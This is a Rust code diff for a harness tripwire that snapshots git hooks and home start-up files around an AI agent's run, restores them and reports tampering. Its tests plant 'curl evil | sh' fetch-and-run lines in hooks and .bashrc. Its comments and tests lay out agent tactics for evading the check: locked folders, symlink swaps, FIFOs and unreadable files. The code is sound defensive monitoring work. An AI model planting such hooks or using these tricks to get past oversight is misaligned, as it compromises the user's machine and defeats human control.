@@ -7,14 +7,14 @@
 //! This only *notices* a change; preventing it would need a sandbox of the
 //! operating system, which not every agent has.
 
+mod files;
+
 use std::collections::BTreeMap;
-use std::fs;
-use std::io;
 use std::path::{Path, PathBuf};
-use std::time::SystemTime;
 
 use crate::git::{GitError, Repo};
 use crate::task::agent_stubs;
+use files::{add_tree, put_back, read, Content};
 
 /// Files inside the home folder that are watched, with `/`. A file that
 /// does not exist is watched too: creating it is a change. Both the Unix
@@ -53,13 +53,6 @@ const GIT_FOLDERS: &[&str] = &["hooks", "info"];
 /// holds no command, so a change to it is not a reason to stop.
 const GIT_OWN_FILES: &[&str] = &["info/refs"];
 
-/// A file bigger than this is remembered by its size and the time it was
-/// last changed instead of its whole content: the `harness` program is tens
-/// of MB, and reading it twice per role would be slow. (A program that also
-/// forges the time could hide a change of such a file.) It can be reported,
-/// but not put back.
-const MAX_KEPT_BYTES: u64 = 1024 * 1024;
-
 /// What the tripwire watches: folders that are put back after a change, and
 /// single files that are only reported.
 #[derive(Debug, Clone, Default)]
@@ -96,11 +89,18 @@ impl Watched {
         })
     }
 
-    /// Reads everything watched now.
-    pub fn snapshot(&self) -> io::Result<Snapshot> {
+    /// Reads everything watched now. A file that cannot be read is noted as
+    /// such rather than failing: an agent could plant one on purpose.
+    pub fn snapshot(&self) -> Snapshot {
         let mut files = BTreeMap::new();
         for folder in &self.restored_folders {
-            add_tree(folder, &mut files)?;
+            // An agent may have locked a folder (`chmod 500`) so that nothing
+            // in it can be read or removed. Unlocking before every snapshot,
+            // also the first, means both see the folders the same way. When
+            // it fails, what is still locked shows up as unreadable or in
+            // `not_put_back`, so the error itself is not needed.
+            let _ = harness_platform::file::unlock(folder);
+            add_tree(folder, &mut files);
         }
         for file in &self.ignored_files {
             files.remove(file);
@@ -110,7 +110,7 @@ impl Watched {
             let content = read(file).unwrap_or_else(|e| Some(Content::Unreadable(e.kind())));
             files.insert(file.clone(), content);
         }
-        Ok(Snapshot { files })
+        Snapshot { files }
     }
 
     /// Is `path` inside one of the folders that are put back?
@@ -128,14 +128,21 @@ impl Watched {
         if path != self.exclude_file {
             return false;
         }
+        let Some(Content::File {
+            bytes: after,
+            permissions: after_permissions,
+        }) = after
+        else {
+            return false;
+        };
         // A missing file counts as empty: Claude Code creates it when it is not there.
         let before = match before {
             None => &[][..],
-            Some(Content::Bytes(bytes)) => bytes.as_slice(),
-            Some(Content::Summary { .. } | Content::Unreadable(_)) => return false,
-        };
-        let Some(Content::Bytes(after)) = after else {
-            return false;
+            // Claude Code only appends lines; it does not change the permissions.
+            Some(Content::File { bytes, permissions }) if permissions == after_permissions => {
+                bytes.as_slice()
+            }
+            Some(_) => return false,
         };
         agent_stubs::only_stub_lines(before, after)
     }
@@ -148,21 +155,6 @@ pub struct Snapshot {
     files: BTreeMap<PathBuf, Option<Content>>,
 }
 
-/// What a file held.
-#[derive(Debug, Clone, PartialEq, Eq)]
-enum Content {
-    /// The whole content of a small file.
-    Bytes(Vec<u8>),
-    /// A big file's size and the time it was last changed.
-    Summary {
-        len: u64,
-        modified: Option<SystemTime>,
-    },
-    /// A file that exists but cannot be read (for example no permission);
-    /// this kind of error is kept, so a change of it is noticed too.
-    Unreadable(io::ErrorKind),
-}
-
 /// What changed between two snapshots, split by what the harness did.
 #[derive(Debug, Clone, Default, PartialEq, Eq)]
 pub struct Changes {
@@ -170,6 +162,9 @@ pub struct Changes {
     pub put_back: Vec<PathBuf>,
     /// Changed single files, left as they are for the user to check.
     pub reported: Vec<PathBuf>,
+    /// Changed files in the restored folders that could not be put back
+    /// (removed when possible): the user must look at them by hand.
+    pub not_put_back: Vec<PathBuf>,
     /// `info/exclude` changed and held Claude Code's block of stub lines
     /// (now put back): its new empty stub files must be removed. When the
     /// block was the only change, it is not a reason to stop.
@@ -179,20 +174,24 @@ pub struct Changes {
 impl Changes {
     /// True when nothing watched changed, apart from Claude Code's stub lines.
     pub fn is_empty(&self) -> bool {
-        self.put_back.is_empty() && self.reported.is_empty()
+        self.put_back.is_empty() && self.reported.is_empty() && self.not_put_back.is_empty()
     }
 }
 
 impl Snapshot {
     /// Compares `self` (taken before the role) with the files now, and puts
-    /// the restored folders back as they were in `self`.
-    pub fn check_and_restore(&self, watched: &Watched) -> io::Result<Changes> {
-        let now = watched.snapshot()?;
+    /// the restored folders back as they were in `self`. A file that cannot
+    /// be put back does not stop the others: an agent must not keep a
+    /// planted hook by making one file impossible to restore.
+    pub fn check_and_restore(&self, watched: &Watched) -> Changes {
+        let now = watched.snapshot();
         let mut changes = Changes::default();
         // A file is in one map or both; `chain` + dedup visits each once.
         let mut paths: Vec<&PathBuf> = self.files.keys().chain(now.files.keys()).collect();
         paths.sort();
         paths.dedup();
+        // Links put back in this pass: what is below them is somewhere else.
+        let mut links_put_back: Vec<&PathBuf> = Vec::new();
         for path in paths {
             let before = self.files.get(path).cloned().flatten();
             let after = now.files.get(path).cloned().flatten();
@@ -200,10 +199,29 @@ impl Snapshot {
                 continue;
             }
             if watched.is_restored(path) {
-                put_back(path, before.as_ref())?;
+                // Below something that could not be removed (maybe a link to
+                // elsewhere), or below a link just made again, any change
+                // would land outside the folder. The paths are sorted, so a
+                // folder comes before what is in it.
+                if changes.not_put_back.iter().any(|f| path.starts_with(f)) {
+                    changes.not_put_back.push(path.clone());
+                    continue;
+                }
+                if links_put_back.iter().any(|link| path.starts_with(link)) {
+                    // Removed together with the folder that the link replaced.
+                    changes.put_back.push(path.clone());
+                    continue;
+                }
+                if put_back(path, before.as_ref()).is_err() {
+                    changes.not_put_back.push(path.clone());
+                    continue;
+                }
+                if matches!(before, Some(Content::Link(_))) {
+                    links_put_back.push(path);
+                }
                 if *path == watched.exclude_file {
                     // Claude Code ran, also when it is not the only change.
-                    changes.claude_stubs = matches!(&after, Some(Content::Bytes(bytes))
+                    changes.claude_stubs = matches!(&after, Some(Content::File { bytes, .. })
                         if agent_stubs::has_stub_block(bytes));
                 }
                 if !watched.is_stub_exclude(path, before.as_ref(), after.as_ref()) {
@@ -213,89 +231,15 @@ impl Snapshot {
                 changes.reported.push(path.clone());
             }
         }
-        Ok(changes)
-    }
-}
-
-/// Adds `path` to `files`: a folder with every file in it (at any depth),
-/// anything else (a file, a link) as one entry.
-fn add_tree(path: &Path, files: &mut BTreeMap<PathBuf, Option<Content>>) -> io::Result<()> {
-    // `symlink_metadata` does not follow a link: a link, even one in place of
-    // the whole folder, is one entry, and the files it points to are not read.
-    match fs::symlink_metadata(path) {
-        Ok(meta) if meta.is_dir() => {
-            for entry in fs::read_dir(path)? {
-                add_tree(&entry?.path(), files)?;
-            }
-            Ok(())
-        }
-        Ok(_) => {
-            files.insert(path.to_path_buf(), read(path)?);
-            Ok(())
-        }
-        Err(e) if e.kind() == io::ErrorKind::NotFound => Ok(()),
-        Err(e) => Err(e),
-    }
-}
-
-/// What `path` holds now, or `None` if it does not exist.
-fn read(path: &Path) -> io::Result<Option<Content>> {
-    let meta = match fs::symlink_metadata(path) {
-        Ok(meta) => meta,
-        Err(e) if e.kind() == io::ErrorKind::NotFound => return Ok(None),
-        Err(e) => return Err(e),
-    };
-    if meta.is_symlink() {
-        let target = fs::read_link(path)?;
-        return Ok(Some(Content::Bytes(
-            format!("link to {}", target.display()).into_bytes(),
-        )));
-    }
-    if meta.len() > MAX_KEPT_BYTES {
-        return Ok(Some(Content::Summary {
-            len: meta.len(),
-            modified: meta.modified().ok(),
-        }));
-    }
-    Ok(Some(Content::Bytes(fs::read(path)?)))
-}
-
-/// Writes `before` back to `path`, or removes `path` if it did not exist.
-fn put_back(path: &Path, before: Option<&Content>) -> io::Result<()> {
-    // A link or file the agent put there is removed first, so writing never
-    // follows a link to somewhere else.
-    match fs::symlink_metadata(path) {
-        Ok(meta) if meta.is_dir() => fs::remove_dir_all(path)?,
-        Ok(_) => fs::remove_file(path)?,
-        // `NotADirectory`: a part of the path is a file, not a folder. The
-        // system says so (ENOTDIR) for a file inside a folder the agent made
-        // in place of a file: the paths are sorted, so that file was already
-        // put back just before and the folder is gone. Nothing is here.
-        // (Windows calls this "path not found", which is `NotFound`.)
-        Err(e)
-            if matches!(
-                e.kind(),
-                io::ErrorKind::NotFound | io::ErrorKind::NotADirectory
-            ) => {}
-        Err(e) => return Err(e),
-    }
-    match before {
-        Some(Content::Bytes(bytes)) => {
-            // The agent may have removed the folder the file was in.
-            if let Some(parent) = path.parent() {
-                fs::create_dir_all(parent)?;
-            }
-            fs::write(path, bytes)
-        }
-        // Files in the restored folders are kept whole when they can be read;
-        // a missing file stays missing.
-        Some(Content::Summary { .. } | Content::Unreadable(_)) | None => Ok(()),
+        changes
     }
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+    use files::MAX_KEPT_BYTES;
+    use std::fs;
 
     fn watched(dir: &Path) -> Watched {
         Watched {
@@ -313,12 +257,9 @@ mod tests {
         fs::write(dir.path().join("hooks/pre-commit.sample"), "sample").unwrap();
         let watched = watched(dir.path());
 
-        let before = watched.snapshot().unwrap();
+        let before = watched.snapshot();
 
-        assert_eq!(
-            before.check_and_restore(&watched).unwrap(),
-            Changes::default()
-        );
+        assert_eq!(before.check_and_restore(&watched), Changes::default());
     }
 
     #[test]
@@ -328,7 +269,7 @@ mod tests {
         let exclude = dir.path().join("info/exclude");
         fs::write(&exclude, "# excludes\n").unwrap();
         let watched = watched(dir.path());
-        let before = watched.snapshot().unwrap();
+        let before = watched.snapshot();
         // What Claude Code appends when it starts its sandbox.
         fs::write(
             &exclude,
@@ -336,7 +277,7 @@ mod tests {
         )
         .unwrap();
 
-        let changes = before.check_and_restore(&watched).unwrap();
+        let changes = before.check_and_restore(&watched);
 
         assert!(changes.is_empty() && changes.claude_stubs, "{changes:?}");
         assert_eq!(fs::read_to_string(&exclude).unwrap(), "# excludes\n");
@@ -349,14 +290,14 @@ mod tests {
         let exclude = dir.path().join("info/exclude");
         fs::write(&exclude, "# excludes\n").unwrap();
         let watched = watched(dir.path());
-        let before = watched.snapshot().unwrap();
+        let before = watched.snapshot();
         fs::write(
             &exclude,
             "# excludes\n\n# claude-code scrub-mode stubs\n/package.json\n/src\n",
         )
         .unwrap();
 
-        let changes = before.check_and_restore(&watched).unwrap();
+        let changes = before.check_and_restore(&watched);
 
         assert_eq!(changes.put_back, std::slice::from_ref(&exclude));
         assert_eq!(fs::read_to_string(&exclude).unwrap(), "# excludes\n");
@@ -367,11 +308,11 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         fs::create_dir_all(dir.path().join("hooks")).unwrap();
         let watched = watched(dir.path());
-        let before = watched.snapshot().unwrap();
+        let before = watched.snapshot();
         let block = "\n\n# claude-code scrub-mode stubs\n/package.json";
         fs::write(dir.path().join("hooks/pre-commit"), block).unwrap();
 
-        let changes = before.check_and_restore(&watched).unwrap();
+        let changes = before.check_and_restore(&watched);
 
         assert_eq!(changes.put_back, [dir.path().join("hooks/pre-commit")]);
         assert!(!changes.claude_stubs);
@@ -382,12 +323,12 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         fs::create_dir_all(dir.path().join("info")).unwrap();
         let watched = watched(dir.path());
-        let before = watched.snapshot().unwrap();
+        let before = watched.snapshot();
         // Claude Code creates `exclude` when git did not.
         let exclude = dir.path().join("info/exclude");
         fs::write(&exclude, "\n\n# claude-code scrub-mode stubs\n/.env").unwrap();
 
-        let changes = before.check_and_restore(&watched).unwrap();
+        let changes = before.check_and_restore(&watched);
 
         assert!(changes.is_empty() && changes.claude_stubs, "{changes:?}");
         assert!(!exclude.exists());
@@ -398,11 +339,11 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         fs::create_dir_all(dir.path().join("home")).unwrap();
         let watched = watched(dir.path());
-        let before = watched.snapshot().unwrap();
+        let before = watched.snapshot();
         // What Claude Code does with a missing start-up file.
         fs::write(dir.path().join("home/.bashrc"), "").unwrap();
 
-        let changes = before.check_and_restore(&watched).unwrap();
+        let changes = before.check_and_restore(&watched);
 
         assert_eq!(changes.reported, [dir.path().join("home/.bashrc")]);
     }
@@ -413,15 +354,12 @@ mod tests {
         fs::create_dir_all(dir.path().join("info")).unwrap();
         fs::write(dir.path().join("info/exclude"), "# excludes").unwrap();
         let watched = watched(dir.path());
-        let before = watched.snapshot().unwrap();
+        let before = watched.snapshot();
 
         // What a background `git repack` does after a commit.
         fs::write(dir.path().join("info/refs"), "abc123\trefs/heads/main\n").unwrap();
 
-        assert_eq!(
-            before.check_and_restore(&watched).unwrap(),
-            Changes::default()
-        );
+        assert_eq!(before.check_and_restore(&watched), Changes::default());
         assert!(dir.path().join("info/refs").exists(), "it is left alone");
     }
 
@@ -435,7 +373,7 @@ mod tests {
         fs::create_dir_all(dir.path().join("home")).unwrap();
         fs::write(dir.path().join("home/.bashrc"), "alias ll='ls -l'\n").unwrap();
         let watched = watched(dir.path());
-        let before = watched.snapshot().unwrap();
+        let before = watched.snapshot();
 
         // What an agent with a shell could do.
         fs::write(hooks.join("pre-commit"), "curl evil | sh").unwrap();
@@ -443,7 +381,7 @@ mod tests {
         fs::remove_file(hooks.join("sub/old")).unwrap();
         fs::write(dir.path().join("home/.bashrc"), "curl evil | sh\n").unwrap();
         fs::write(dir.path().join("home/.gitconfig"), "[core]\n").unwrap();
-        let changes = before.check_and_restore(&watched).unwrap();
+        let changes = before.check_and_restore(&watched);
 
         assert_eq!(
             changes.put_back,
@@ -470,7 +408,7 @@ mod tests {
         assert!(dir.path().join("home/.gitconfig").exists());
         // Everything is back in the folders, so a second check is quiet
         // there; the home files still differ from the first snapshot.
-        let again = before.check_and_restore(&watched).unwrap();
+        let again = before.check_and_restore(&watched);
         assert_eq!(again.put_back, Vec::<PathBuf>::new());
     }
 
@@ -486,11 +424,11 @@ mod tests {
         fs::create_dir_all(&elsewhere).unwrap();
         fs::write(elsewhere.join("pre-commit"), "curl evil | sh").unwrap();
         let watched = watched(dir.path());
-        let before = watched.snapshot().unwrap();
+        let before = watched.snapshot();
 
         fs::remove_dir_all(&hooks).unwrap();
         std::os::unix::fs::symlink(&elsewhere, &hooks).unwrap();
-        let changes = before.check_and_restore(&watched).unwrap();
+        let changes = before.check_and_restore(&watched);
 
         assert_eq!(
             changes.put_back,
@@ -516,14 +454,11 @@ mod tests {
             ignored_files: Vec::new(),
             exclude_file: dir.path().join("exclude"),
         };
-        let before = watched.snapshot().unwrap();
+        let before = watched.snapshot();
 
         fs::write(&program, vec![b'b'; size + 1]).unwrap();
 
-        assert_eq!(
-            before.check_and_restore(&watched).unwrap().reported,
-            [program]
-        );
+        assert_eq!(before.check_and_restore(&watched).reported, [program]);
     }
 
     #[test]
@@ -564,10 +499,10 @@ mod tests {
         let limit = usize::try_from(MAX_KEPT_BYTES).unwrap();
         fs::write(&hook, vec![b'a'; limit]).unwrap();
         let watched = watched(dir.path());
-        let before = watched.snapshot().unwrap();
+        let before = watched.snapshot();
         fs::write(&hook, vec![b'b'; limit]).unwrap();
 
-        let changes = before.check_and_restore(&watched).unwrap();
+        let changes = before.check_and_restore(&watched);
 
         assert_eq!(changes.put_back, std::slice::from_ref(&hook));
         assert_eq!(fs::read(&hook).unwrap(), vec![b'a'; limit]);
@@ -581,10 +516,10 @@ mod tests {
         let over_limit = usize::try_from(MAX_KEPT_BYTES).unwrap() + 1;
         fs::write(&bashrc, vec![b'a'; over_limit]).unwrap();
         let watched = watched(dir.path());
-        let before = watched.snapshot().unwrap();
+        let before = watched.snapshot();
         fs::write(&bashrc, vec![b'a'; over_limit + 1]).unwrap();
 
-        let changes = before.check_and_restore(&watched).unwrap();
+        let changes = before.check_and_restore(&watched);
 
         assert_eq!(changes.reported, [bashrc]);
     }
@@ -596,7 +531,7 @@ mod tests {
         let hook = dir.path().join("hooks/commit-msg");
         fs::write(&hook, "original").unwrap();
         let watched = watched(dir.path());
-        let before = watched.snapshot().unwrap();
+        let before = watched.snapshot();
         fs::remove_file(&hook).unwrap();
         fs::create_dir_all(&hook).unwrap();
         fs::write(hook.join("run.sh"), "echo planted").unwrap();
@@ -604,7 +539,7 @@ mod tests {
         let planted = dir.path().join("hooks/post-checkout");
         fs::write(&planted, "echo planted").unwrap();
 
-        let changes = before.check_and_restore(&watched).unwrap();
+        let changes = before.check_and_restore(&watched);
 
         assert_eq!(
             changes.put_back,
@@ -612,5 +547,309 @@ mod tests {
         );
         assert_eq!(fs::read_to_string(&hook).unwrap(), "original");
         assert!(!planted.exists());
+    }
+
+    // The permissions below are Unix modes; a Windows file has only a
+    // read-only flag, which is kept the same way.
+    #[cfg(unix)]
+    #[test]
+    fn a_hook_is_put_back_still_executable() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        fs::create_dir_all(dir.path().join("hooks")).unwrap();
+        let hook = dir.path().join("hooks/pre-commit");
+        fs::write(&hook, "cargo fmt --check").unwrap();
+        fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        fs::remove_file(&hook).unwrap();
+        fs::write(&hook, "curl evil | sh").unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.put_back, std::slice::from_ref(&hook));
+        assert_eq!(fs::read_to_string(&hook).unwrap(), "cargo fmt --check");
+        let mode = fs::metadata(&hook).unwrap().permissions().mode();
+        assert_eq!(
+            mode & 0o777,
+            0o755,
+            "git skips a hook that is not executable"
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_hook_made_executable_is_a_change() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        fs::create_dir_all(dir.path().join("hooks")).unwrap();
+        let hook = dir.path().join("hooks/pre-commit");
+        fs::write(&hook, "echo off").unwrap();
+        fs::set_permissions(&hook, fs::Permissions::from_mode(0o644)).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.put_back, std::slice::from_ref(&hook));
+        let mode = fs::metadata(&hook).unwrap().permissions().mode();
+        assert_eq!(mode & 0o777, 0o644);
+    }
+
+    // Making a link needs extra rights on Windows, so this runs on Linux and macOS.
+    #[cfg(unix)]
+    #[test]
+    fn a_linked_hook_is_put_back_as_a_link() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::create_dir_all(dir.path().join("hooks")).unwrap();
+        fs::write(dir.path().join("check.sh"), "cargo test").unwrap();
+        let hook = dir.path().join("hooks/pre-push");
+        std::os::unix::fs::symlink("../check.sh", &hook).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        fs::remove_file(&hook).unwrap();
+        fs::write(&hook, "curl evil | sh").unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.put_back, std::slice::from_ref(&hook));
+        assert_eq!(fs::read_link(&hook).unwrap(), Path::new("../check.sh"));
+        assert_eq!(fs::read_to_string(&hook).unwrap(), "cargo test");
+    }
+
+    #[test]
+    fn one_file_that_cannot_be_put_back_does_not_stop_the_others() {
+        let dir = tempfile::tempdir().unwrap();
+        // `info/refs` is not watched, but here it is a folder holding a file
+        // that is. An agent turns the folder into a file: the watched file
+        // cannot be written back, since its folder cannot be made. (This
+        // fails even for root, unlike a file without permissions.)
+        fs::create_dir_all(dir.path().join("info/refs")).unwrap();
+        let inside = dir.path().join("info/refs/heads");
+        fs::write(&inside, "kept").unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        fs::remove_dir_all(dir.path().join("info/refs")).unwrap();
+        fs::write(dir.path().join("info/refs"), "a file now").unwrap();
+        // Sorted after the failing file: it must still be removed.
+        let planted = dir.path().join("info/sparse-checkout");
+        fs::write(&planted, "planted").unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.not_put_back, [inside]);
+        assert_eq!(changes.put_back, std::slice::from_ref(&planted));
+        assert!(!planted.exists());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_planted_pipe_is_removed_without_reading_it() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::create_dir_all(dir.path().join("hooks")).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        let pipe = dir.path().join("hooks/pre-commit");
+        let made = std::process::Command::new("mkfifo")
+            .arg(&pipe)
+            .status()
+            .unwrap();
+        assert!(made.success());
+
+        // Reading the pipe would wait forever, so the check runs in a
+        // thread and the test fails after a while instead of hanging.
+        let (sender, receiver) = std::sync::mpsc::channel();
+        std::thread::spawn(move || {
+            let changes = before.check_and_restore(&watched);
+            sender.send(changes.put_back).unwrap();
+        });
+        let put_back = receiver
+            .recv_timeout(std::time::Duration::from_secs(10))
+            .expect("the check hung on the pipe");
+
+        assert_eq!(put_back, std::slice::from_ref(&pipe));
+        fs::symlink_metadata(&pipe).unwrap_err();
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_planted_socket_is_removed_without_reading_it() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::create_dir_all(dir.path().join("hooks")).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        let socket = dir.path().join("hooks/post-checkout");
+        let _listener = std::os::unix::net::UnixListener::bind(&socket).unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.put_back, std::slice::from_ref(&socket));
+        fs::symlink_metadata(&socket).unwrap_err();
+    }
+
+    // As root (in a container) every file can be read, so there this passes
+    // also without the fix; as a user (CI) the unreadable file used to fail
+    // the whole check before anything was put back.
+    #[cfg(unix)]
+    #[test]
+    fn an_unreadable_planted_hook_does_not_stop_the_check() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        fs::create_dir_all(dir.path().join("hooks")).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        let locked = dir.path().join("hooks/0");
+        fs::write(&locked, "secret").unwrap();
+        fs::set_permissions(&locked, fs::Permissions::from_mode(0o000)).unwrap();
+        let planted = dir.path().join("hooks/pre-commit");
+        fs::write(&planted, "curl evil | sh").unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.put_back, [locked.clone(), planted.clone()]);
+        assert!(!locked.exists());
+        assert!(!planted.exists());
+    }
+
+    // As root (in a container) the rights are not checked, so there these two
+    // pass also without unlocking; as a user (CI) they do not.
+    #[cfg(unix)]
+    #[test]
+    fn a_hook_in_a_locked_hooks_folder_is_still_removed() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        let hooks = dir.path().join("hooks");
+        fs::create_dir_all(&hooks).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        let planted = hooks.join("pre-commit");
+        fs::write(&planted, "curl evil | sh").unwrap();
+        // Git can still run what is inside, but nothing can be removed.
+        fs::set_permissions(&hooks, fs::Permissions::from_mode(0o500)).unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.put_back, std::slice::from_ref(&planted));
+        assert_eq!(changes.not_put_back, Vec::<PathBuf>::new());
+        assert!(!planted.exists());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_hook_in_a_folder_that_cannot_be_entered_is_still_removed() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        fs::create_dir_all(dir.path().join("hooks")).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        let folder = dir.path().join("hooks/d");
+        fs::create_dir_all(&folder).unwrap();
+        fs::write(folder.join("f"), "planted").unwrap();
+        // Can be listed, but not entered (`chmod 600`).
+        fs::set_permissions(&folder, fs::Permissions::from_mode(0o600)).unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.put_back, [folder.join("f")]);
+        assert_eq!(changes.not_put_back, Vec::<PathBuf>::new());
+        assert!(!folder.join("f").exists());
+    }
+
+    #[test]
+    fn a_changed_big_hook_is_not_called_put_back() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::create_dir_all(dir.path().join("hooks")).unwrap();
+        let hook = dir.path().join("hooks/pre-push");
+        let over_limit = usize::try_from(MAX_KEPT_BYTES).unwrap() + 1;
+        fs::write(&hook, vec![b'a'; over_limit]).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        fs::write(&hook, vec![b'b'; over_limit + 1]).unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        // No copy was kept: the agent's version is removed, and the user is
+        // told the file is not as before.
+        assert_eq!(changes.not_put_back, std::slice::from_ref(&hook));
+        assert_eq!(changes.put_back, Vec::<PathBuf>::new());
+        assert!(!hook.exists());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn nothing_is_written_through_a_link_that_could_not_be_removed() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        let git = dir.path().join("git");
+        let hooks = git.join("hooks");
+        fs::create_dir_all(&hooks).unwrap();
+        fs::write(hooks.join("pre-commit"), "mine").unwrap();
+        let watched = Watched {
+            restored_folders: vec![hooks.clone()],
+            reported_files: Vec::new(),
+            ignored_files: Vec::new(),
+            exclude_file: git.join("info/exclude"),
+        };
+        let before = watched.snapshot();
+        let elsewhere = dir.path().join("elsewhere");
+        fs::create_dir_all(&elsewhere).unwrap();
+        fs::remove_dir_all(&hooks).unwrap();
+        std::os::unix::fs::symlink(&elsewhere, &hooks).unwrap();
+        // The folder holding the link is locked, so the link cannot be
+        // removed. (Root may remove it anyway: then the hooks come back.)
+        fs::set_permissions(&git, fs::Permissions::from_mode(0o500)).unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        fs::set_permissions(&git, fs::Permissions::from_mode(0o700)).unwrap();
+        assert!(
+            !elsewhere.join("pre-commit").exists(),
+            "written through the link"
+        );
+        if changes.not_put_back.is_empty() {
+            assert_eq!(
+                fs::read_to_string(hooks.join("pre-commit")).unwrap(),
+                "mine"
+            );
+        } else {
+            assert_eq!(
+                changes.not_put_back,
+                [hooks.clone(), hooks.join("pre-commit")]
+            );
+        }
+    }
+
+    // Making a link needs extra rights on Windows, so this runs on Linux and macOS.
+    #[cfg(unix)]
+    #[test]
+    fn nothing_is_removed_through_a_linked_folder_put_back() {
+        let dir = tempfile::tempdir().unwrap();
+        let shared = dir.path().join("shared");
+        fs::create_dir_all(&shared).unwrap();
+        fs::write(shared.join("pre-commit"), "the user's own").unwrap();
+        let hooks = dir.path().join("hooks");
+        std::os::unix::fs::symlink(&shared, &hooks).unwrap();
+        let watched = watched(dir.path());
+        let before = watched.snapshot();
+        // The agent puts a real folder in place of the link.
+        fs::remove_file(&hooks).unwrap();
+        fs::create_dir_all(&hooks).unwrap();
+        fs::write(hooks.join("pre-commit"), "curl evil | sh").unwrap();
+
+        let changes = before.check_and_restore(&watched);
+
+        assert_eq!(changes.put_back, [hooks.clone(), hooks.join("pre-commit")]);
+        assert_eq!(fs::read_link(&hooks).unwrap(), shared);
+        assert_eq!(
+            fs::read_to_string(shared.join("pre-commit")).unwrap(),
+            "the user's own"
+        );
     }
 }
